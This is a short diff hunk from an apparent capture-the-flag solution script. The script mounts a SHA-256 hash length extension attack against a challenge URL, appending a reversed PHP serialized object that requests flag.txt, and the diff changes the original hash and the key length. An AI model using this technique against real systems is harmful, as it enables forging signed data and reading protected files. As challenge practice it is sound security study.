@@ -42,10 +42,10 @@ def php_urlencode(s):
     return output
 
 url = 'http://web2015.icec.tf/giga/files.php'
-original_hash = '25379ccdaefc067c701659406dad068fe5dacefa53a45a9fdf402b8942c247c2'
+original_hash = 'f4229fe3f6cae91ad77f32cfda0de36c228b49d3b3a4b236beb3eee63411616a'
 original_data = ';0:b'
 appended_data = "".join(reversed('O:4:"File":1:{s:8:"filename";s:8:"flag.txt";}'))
-key_length = 32
+key_length = 40
 
 # Get our new hash for our new data
 sha = hlextend.new('sha256')
